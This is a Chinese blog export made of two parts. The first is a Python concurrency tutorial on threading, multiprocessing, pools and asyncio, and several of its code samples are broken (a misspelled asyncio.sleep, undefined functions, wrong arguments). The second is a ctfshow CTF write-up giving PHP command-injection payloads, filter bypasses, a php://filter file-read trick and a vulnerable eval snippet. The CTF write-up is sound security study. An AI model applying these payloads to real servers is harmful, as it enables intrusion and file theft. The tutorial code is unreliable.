<h2 id="1-2-非阻塞"><a href="#1-2-非阻塞" class="headerlink" title="1.2 非阻塞"></a>1.2 非阻塞</h2><ul>
<li><strong>程序在等待某操作过程中，自身不被阻塞，可以继续运行干别的事情，则称该程序在该操作上是非阻塞的。</strong></li>
<li>非阻塞并<code>不是</code>在任何程序级别、任何情况下都可以存在的。</li>
<li>仅当程序封装的级别可以囊括独立的子程序单元时，它才可能存在非阻塞状态。</li>
</ul>
<p>非阻塞的存在是因为阻塞存在，正因为某个操作阻塞导致的耗时与效率低下，我们才要把它变成非阻塞的。</p>
<h2 id="1-3-同步"><a href="#1-3-同步" class="headerlink" title="1.3 同步"></a>1.3 同步</h2><ul>
<li>不同程序单元为了完成某个任务，在执行过程中需靠某种通信方式以<strong>协调一致</strong>，称这些程序单元是同步执行的。</li>
<li>例如购物系统中更新商品库存，需要用“行锁”作为通信信号，让不同的更新请求强制排队顺序执行，那更新库存的操作是同步的。</li>
<li>简言之，<strong>同步意味着有序</strong>。</li>
</ul>
<h2 id="1-4-异步"><a href="#1-4-异步" class="headerlink" title="1.4 异步"></a>1.4 异步</h2><ul>
<li>为完成某个任务，不同程序单元之间<strong>过程中无需通信协调</strong>，也能完成任务的方式。</li>
<li>不相关的程序单元之间可以是异步的。</li>
<li>例如，爬虫下载网页。调度程序调用下载程序后，即可调度其他任务，而无需与该下载任务保持通信以协调行为。不同网页的下载、保存等操作都是无关的，也无需相互通知协调。这些异步操作的完成时刻并不确定。</li>
<li>简言之，<strong>异步意味着无序</strong>。</li>
</ul>
<p>上文提到的<code>“通信方式”</code>通常是指异步和并发编程提供的<code>同步原语</code>，如<code>信号量</code>、<code>锁</code>、<code>同步队列</code>等等。我们需知道，虽然这些通信方式是为了让多个程序在一定条件下同步执行，但正因为是异步的存在，才需要这些通信方式。如果所有程序都是按序执行，其本身就是同步的，又何需这些同步信号呢？</p>
<h2 id="1-5-并发"><a href="#1-5-并发" class="headerlink" title="1.5 并发"></a>1.5 并发</h2><ul>
<li>并发描述的是程序的组织结构。指程序要被设计成多个可独立执行的子任务。</li>
<li><strong>以利用有限的计算机资源使多个任务可以被实时或近实时执行为目的。</strong></li>
</ul>
<h2 id="1-6-并行"><a href="#1-6-并行" class="headerlink" title="1.6 并行"></a>1.6 并行</h2><ul>
<li>并行描述的是程序的执行状态。指多个任务同时被执行。</li>
<li><strong>以利用富余计算资源（多核CPU）加速完成多个任务为目的。</strong></li>
</ul>
<p>并发提供了一种程序组织结构方式，让问题的解决方案可以并行执行，但并行执行不是必须的。</p>
<h2 id="1-7-概念总结"><a href="#1-7-概念总结" class="headerlink" title="1.7 概念总结"></a>1.7 概念总结</h2><ul>
<li><code>**并行**</code>是为了利用多核加速多任务完成的进度</li>
<li><code>**并发**</code>是为了让独立的子任务都有机会被尽快执行，但不一定能加速整体进度</li>
<li><code>**非阻塞**</code>是为了提高程序整体执行效率</li>
<li><code>**异步**</code>是高效地组织非阻塞任务的方式</li>
</ul>
<h2 id="1-8-全局解释器锁"><a href="#1-8-全局解释器锁" class="headerlink" title="1.8 全局解释器锁"></a>1.8 全局解释器锁</h2><ul>
<li>CPython 在解释器进程级别有一把锁，叫做GIL，即全局解释器锁。</li>
<li>GIL 保证CPython进程中，只有一个线程执行字节码。甚至是在多核CPU的情况下，也只允许同时只能有一个CPU 上运行该进程的一个线程。</li>
<li>CPython中<ol>
<li><strong>IO密集型</strong>，某个线程阻塞，就会调度其他就绪线程；</li>
<li><strong>CPU密集型</strong>，当前线程可能会连续的获得GIL，导致其它线程几乎无法使用CPU。</li>
</ol>
</li>
<li>在CPython中由于有GIL存在，IO密集型，使用多线程较为合算；CPU密集型，使用多进程，要绕开GIL。</li>
</ul>
<p>要支持并发，必须拆分为多任务，不同任务相对而言才有阻塞&#x2F;非阻塞、同步&#x2F;异步。所以，并发、异步、非阻塞三个词总是如影随形。</p>
<h1 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a><center>多线程</center></h1><p>了解以上内容，就可以来看多线程了，标题明明没有多线程我为什么还要讲多线程呢？</p>
<p>Python因为<code>GIL（全局解释器锁）</code>的存在，Python的多线程并不是真正的多线程，但是在同步不阻塞的情况下，却可以发挥出多线程的效果，无法做到异步，但是可以推荐了解一下，了解之后可以更方便学习多进程。</p>
<h2 id="线程的基本概念"><a href="#线程的基本概念" class="headerlink" title="线程的基本概念"></a>线程的基本概念</h2><p><code>线程</code>是指进程内的一个执行单元,也是进程内的可调度实体。</p>
<p><font color="red"><strong>一个进程可以拥有多个线程。</strong></font></p>
<p>与进程的区别:  </p>
<ul>
<li><p>地址空间:进程内的一个执行单元;进程至少有一个线程;它们共享进程的地址空间;而进程有自己独立的地址空间； </p>
</li>
<li><p>资源拥有:进程是资源分配和拥有的单位,同一个进程内的线程共享进程的资源；</p>
</li>
<li><p>线程是处理器调度的基本单位,但进程不是；</p>
</li>
<li><p>二者均可并发执行。</p>
</li>
</ul>
<p>简而言之,<font color="red"><strong>一个程序至少有一个进程,一个进程至少有一个线程</strong></font>。</p>
<p>线程的划分尺度小于进程，使得多线程程序的并发性高。<br>另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率。</p>
<h2 id="threading、queue"><a href="#threading、queue" class="headerlink" title="threading、queue"></a>threading、queue</h2><p>Python实现多线程主要用threading模块，线程同步则是用queue模块实现。</p>
<p>线程同步有4种实现方式：</p>
<ul>
<li>锁机制</li>
<li>信号量</li>
<li>条件判断</li>
<li>同步队列</li>
</ul>
<p>queue模块内部封装了锁原语，使用先进先出队列的时候使用互斥锁。</p>
<p>下面用这个例子讲解：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># 打开文件</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">            line = line.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            q.put(line)</span><br><span class="line">            <span class="built_in">print</span>(line)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resp</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = q.get()</span><br><span class="line">        s += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> q.empty():</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dir.txt&quot;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">                f.writelines(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    threadings = []</span><br><span class="line"></span><br><span class="line">    t1 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    t1.start()</span><br><span class="line">    threadings.append(t1)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        t2 = threading.Thread(target=resp, args=(q,))</span><br><span class="line">        t2.start()</span><br><span class="line">        threadings.append(t2)</span><br><span class="line">    <span class="keyword">for</span> thread <span class="keyword">in</span> threadings:</span><br><span class="line">        thread.join()</span><br></pre></td></tr></table></figure>

<p>代码第26行实例化了一个先进先出的queue队列，27行创建一个线程池。</p>
<p><code>t1</code>是第一个线程，target指向方法，atgs指向传值，q后面必须加逗号。</p>
<p>31-33行，把t1添加到线程池，等他循环完，就阻塞。</p>
<h1 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a><center>多进程</center></h1><p>Python中的多线程无法利用多核优势，如果想要<code>充分地使用多核CPU的资源</code>，在python中大部分情况需要使用多进程。</p>
<h2 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h2><p>Python实现多进程主要依靠<code>multiprocessing模块</code>实现.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br></pre></td></tr></table></figure>

<p><code>multiprocessing</code>模块用来开启子进程，并在子进程中执行我们定制的任务（比如函数）</p>
<p><code>multiprocessing</code>模块的功能众多：支持子进程、<strong>通信和共享数据</strong>、执行不同形式的同步，提供了<code>Process、Queue、Pipe、Lock</code>等组件。</p>
<p><font color="red"><strong>与线程不同，进程没有任何共享状态，进程修改的数据，改动仅限于该进程内</strong></font></p>
<p>写法与线程类死，但是<font color="red"><strong>进程类必须在main()内</strong></font>,使用队列也必须是multiprocessing内的队列。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Queue</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">text1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;线程启动了&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Queue()</span><br><span class="line">    p1 = Process(target=text1, args=(q,))</span><br><span class="line">    p1.start()</span><br><span class="line">    p1.join()</span><br></pre></td></tr></table></figure>

<p><font color="red"><strong>有两种启动方式，多线程必须用.start()，如果用.run()就降级为单进程了。</strong></font></p>
<h1 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a><center>进程池</center></h1><p>主要用multiprocessing中的Pool实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br></pre></td></tr></table></figure>

<p>例子</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process, Pool, Pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    q = Pipe</span><br><span class="line">    <span class="comment"># 100个任务</span></span><br><span class="line">    data = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">100</span>))</span><br><span class="line">    <span class="comment"># 进程池大小</span></span><br><span class="line">    pool = Pool(processes=<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># 一个一个提交</span></span><br><span class="line">    <span class="comment"># pool_out_puts = pool.apply(index_pool,(q,))</span></span><br><span class="line">    <span class="comment"># 一次性大量提交</span></span><br><span class="line">    pool_out_puts = pool.<span class="built_in">map</span>(index_pool, (q,))</span><br><span class="line">    pool.close()<span class="comment"># 关闭进程</span></span><br><span class="line">    pool.join()<span class="comment"># 阻塞进程</span></span><br></pre></td></tr></table></figure>

<p><strong>线程池是不能用队列来进行通信的，要用管道，也就是Pipe</strong></p>
<p>apply_async() 异步提交任务</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))</span><br><span class="line">        <span class="built_in">print</span>(res.get())</span><br></pre></td></tr></table></figure>

<p>只能通过.get()得到返回值</p>
<p>通过异步的方式取返回值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    res_lst = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))     <span class="comment"># 先把任务全提交</span></span><br><span class="line">        res_lst.append(res)</span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> res_lst:</span><br><span class="line">        <span class="built_in">print</span>(res.get())  <span class="comment"># get本身就有阻塞的效果了，就不需要join再阻塞一次了,谁先拿到结果先取谁就行了</span></span><br></pre></td></tr></table></figure>

<p>用map()提交任务时取返回值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool,Queue,Pipe</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    ret = <span class="built_in">map</span>(func, <span class="built_in">range</span>(<span class="number">20</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;--&gt;&#x27;</span>, i)    </span><br></pre></td></tr></table></figure>

<h1 id="异步"><a href="#异步" class="headerlink" title="异步"></a><center>异步</center></h1><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>让一个线程在代码中来回切换游走。</p>
<p>协程（Corourine），也可以称为微线程，是一种用户态内的上下文切换技术。简而言之，其实就是通过一个线程实现代码块相互切换执行。</p>
<p>实现协程的方法的主流方法</p>
<p>async、await关键字（&gt;Python3.5）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去生成一个事件循环</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># 将任务放到任务列表</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>协程的意义</p>
<p>  在一个线程中遇到如果遇到IO等待时间，线程不会等待，利用空闲的时间再去做其他的事情。</p>
</li>
</ul>
<h2 id="asyncio事件循环"><a href="#asyncio事件循环" class="headerlink" title="asyncio事件循环"></a>asyncio事件循环</h2><p> 也就是一个死循环，去检测并执行某些代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 伪代码</span></span><br><span class="line"></span><br><span class="line">任务列表 = [任务<span class="number">1</span>， 任务<span class="number">2</span>， 任务<span class="number">3</span>，。。。。]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    可执行的任务列表，已完成的任务列表 = 去任务列表中检查所有任务，将<span class="string">&#x27;可执行&#x27;</span>和<span class="string">&#x27;已执行&#x27;</span>的任务返回</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 就绪任务 <span class="keyword">in</span> 可执行任务列表:</span><br><span class="line">        执行已就绪的任务</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> 已完成的任务 <span class="keyword">in</span> 已完成的任务列表:</span><br><span class="line">        在任务列表中移除 已完成的任务</span><br><span class="line">        </span><br><span class="line">    如果 任务列表 中的任务都已完成，则终止循环</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去生成一个事件循环</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># 将任务放到任务列表</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>



<ul>
<li><p>协程函数</p>
<ul>
<li>定义函数的时候<code>async def 函数名</code></li>
</ul>
</li>
<li><p>协程对象</p>
<ul>
<li>执行协程函数()得到的就是协程对象</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">result = func()</span><br></pre></td></tr></table></figure>

<p><strong>执行协程函数创建协程对象，函数内部不会执行代码</strong></p>
<p>如果想要运行协程函数内部代码，必须要把协程对象交给事件循环来处理。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">q = func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python &gt; 3.7</span></span><br><span class="line">asyncio.run(q)</span><br></pre></td></tr></table></figure>



<h2 id="await关键字"><a href="#await关键字" class="headerlink" title="await关键字"></a>await关键字</h2><p>await+可等待对象（协程对象、Future、Task对象）</p>
<p>  await就是等待对象的值得到结果之后在继续向下走</p>
<p>示例1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    response = <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run( func1() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>示例2：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;返回值&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;执行协程函数内部代码&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">await</span> others()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;IO请求结束，结果为：&#x27;</span>, response)</span><br><span class="line"></span><br><span class="line">asyncio.run( func() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Task对象"><a href="#Task对象" class="headerlink" title="Task对象"></a>Task对象</h2><p>在事件循环中添加多个任务</p>
<p>Task对象用于并发的调度协程，通过<code>asyncio.create_task(协程对象)</code>的方式创建Task对象，这样可以让协程加入事件循环当中等待被调度执行。除了使用<code>asyncio.create_task()</code>函数以外，还可以用低层的<code>loop.create_task()</code>或<code>ensure_future()</code>函数。<strong>不建议手动实例化task对象。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;返回值&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;main开始&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将任务添加到事件循环</span></span><br><span class="line">    task_list = [</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&#x27;n1&#x27;</span>),</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&quot;n2&quot;</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;main结束&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># done是一个集合</span></span><br><span class="line">    done,pending = <span class="keyword">await</span> asyncio.wait(task_list, timeout=<span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(done)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建事件循环</span></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="concurrent-futures-Future-对象"><a href="#concurrent-futures-Future-对象" class="headerlink" title="concurrent.futures.Future()对象"></a>concurrent.futures.Future()对象</h2><p>使用线程池、进程池实现异步操作时用到的对象。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> Future</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.process <span class="keyword">import</span> ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">value</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个线程池</span></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建进程池</span></span><br><span class="line">pool1 = ProcessPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    fut = pool.submit(func, i)</span><br><span class="line">    <span class="built_in">print</span>(fut)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>以后可能存在交叉使用。</p>
<p>多个方法的时候，就回调函数</p>
<p>基于多线程实现的异步</p>
<p>CPU密集型用多进程，IO密集型用异步</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><center>总结</center></h1><ul>
<li><p>信号量，多进程，进程池的区别  </p>
<p>  <strong>信号量</strong>：如果有500件衣服要做，于是招了500个人，只有4台机器，谁完成任务了再进几个人，也就是4个信号量，500个进程，机器是cpu，4个cpu，每个人是每个进程，每件衣服是一个任务  </p>
<p>  <strong>多进程</strong>：500个人抢四台机器，每个人只能工作十分钟，相对于时间片，不管做没有做完，就走了，就是500个进程做500个任务  </p>
<p>  <strong>进程池</strong>：4个人做500件衣服，4台机器，谁来谁就可以做衣服。而对于多进程来说，操作系统来调度500个人谁用机器，谁不用机器，和调度4个人是不一样的。所以不能有几件衣服就雇几个人，而是都几台机器就雇几个人。这样人都转起来了，并且都能完成任务。而且工厂负担也小一点，这就是池的概念。</p>
</li>
</ul>
<p>CPU密集用多进程，IO密集用异步协程</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow命令执行</title>
    <url>/WP/ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>VIP题目，情况极多，记录！</p>
<span id="more"></span>

<h1 id="web-29"><a href="#web-29" class="headerlink" title="web 29"></a>web 29</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">通配符</span><br><span class="line">payload1:c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla?????&quot;</span>);</span><br><span class="line">payload2:c=<span class="title function_ invoke__">system</span>(<span class="string">&quot;nl fla*&quot;</span>);</span><br><span class="line">payload3:c=<span class="keyword">echo</span> `nl fl<span class="string">&#x27;&#x27;</span>ag.php`;或者c=<span class="keyword">echo</span> `nl fl“”ag.php`;</span><br><span class="line">payload4:c=<span class="keyword">echo</span> `nl fl\ag.php`;<span class="comment">//转义字符绕过</span></span><br><span class="line">payload5:c=<span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">payload6:c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;nl flag.php&#x27;</span>);</span><br><span class="line">payload7:c=awk <span class="string">&#x27;&#123;printf $0&#125;&#x27;</span> flag.php||</span><br><span class="line">还有很多姿势，毕竟等于没过滤</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web-30"><a href="#web-30" class="headerlink" title="web 30"></a>web 30</h1><p>在上一道题的基础上多了<code>system和php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>()</span><br><span class="line"><span class="title function_ invoke__">passthru</span>()</span><br><span class="line"><span class="title function_ invoke__">exec</span>()</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>()</span><br><span class="line"><span class="title function_ invoke__">popen</span>()</span><br><span class="line"><span class="title function_ invoke__">proc_open</span>()</span><br><span class="line"><span class="title function_ invoke__">pcntl_exec</span>()</span><br><span class="line">反引号 同<span class="title function_ invoke__">shell_exec</span>() </span><br></pre></td></tr></table></figure>


<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;nl fla?????&#x27;</span>);</span><br><span class="line">c=<span class="keyword">echo</span> `nl fla<span class="string">&#x27;&#x27;</span>g.p<span class="string">&#x27;&#x27;</span>hp`;</span><br><span class="line">c=<span class="keyword">echo</span> `nl fla?????`;</span><br><span class="line">还有上一道题的很多payload都可以使用</span><br></pre></td></tr></table></figure>


<h1 id="web-31"><a href="#web-31" class="headerlink" title="web 31"></a>web 31</h1><p>过滤了<code>cat\sort等</code>,空格也被过滤了尝试了一堆方法无果，尝试搞骚得</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


